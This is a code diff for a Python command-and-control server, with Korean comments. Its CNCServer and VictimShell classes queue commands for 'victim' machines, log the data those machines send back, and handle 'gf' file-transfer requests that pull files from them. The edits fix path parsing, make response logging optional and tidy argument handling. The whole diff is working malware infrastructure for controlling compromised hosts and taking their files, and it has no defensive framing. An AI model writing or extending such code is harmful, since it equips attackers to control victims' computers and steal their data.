@@ -116,6 +116,9 @@ class VictimShell(BaseShell):
         else:
             return self.default('gf ' + arg)
 
+        if '\\' in parsed_arg[-1]:
+            parsed_arg[-1] = parsed_arg[-1].split('\\')[-1]
+
         with open(FILE_PATH+parsed_arg[-1], 'wb'):
             pass
 
@@ -138,13 +141,6 @@ class CNCServer(BaseHTTPRequestHandler):
     # 파싱된 데이터 로깅
     def _logging_parsed_data(self, victim_ip, parsed_data):
         Logger.info("{} : {}".format(victim_ip, str(parsed_data)))
-        '''try:
-            for header, value in parsed_data.items():
-                if header == 'data':
-                    value = value.decode(ENCODING)
-                Logger.info('{0} : {1}'.format(header, value))
-        except UnicodeDecodeError as e:
-            Logger.error('not utf-8 data')'''
 
     # 큐에 쌓인 명령어 pop
     def _pop_command_queue(self, victim_ip) -> str:
@@ -195,7 +191,7 @@ class CNCServer(BaseHTTPRequestHandler):
         self._response_writer(DDP.raw('FTP_REQUEST', 0, data.encode(ENCODING)))
 
     # 응답 처리 및 응답 메시지 로깅
-    def _response_writer(self, data : bytes, additional_header={}):
+    def _response_writer(self, data : bytes, additional_header={}, logging=True):
         self.send_response(200)
         self.send_header('Content-Type', 'text/plain; charset={}'.format(ENCODING))
 
@@ -206,10 +202,11 @@ class CNCServer(BaseHTTPRequestHandler):
 
         self.wfile.write(data)
 
-        try:
-            Logger.info('response ' + str(data))
-        except:
-            Logger.info('response unknown data')
+        if logging:
+            try:
+                Logger.info('response ' + str(data))
+            except:
+                Logger.info('response unknown data')
 
     # vimctim 추가
     def _append_victim(self, victim_ip, victim_name=""):
@@ -341,8 +338,10 @@ class CNCServer(BaseHTTPRequestHandler):
                 # gf 명령어 처리
                 elif data.startswith('[gf'):
                     file_name = data.split(' ')
-
-                    self._response_ftp_request(file_name[len(file_name)-2], victim_ip, file_name[len(file_name)-1][:-1])
+                    if len(file_name) == 3:
+                        self._response_ftp_request(file_name[len(file_name)-2], victim_ip, file_name[len(file_name)-1][:-1])
+                    else:
+                        self._response_ftp_request(file_name[len(file_name)-1], victim_ip, file_name[len(file_name)-1][:-1])
                     return
             # shell 명령어 처리
             else:
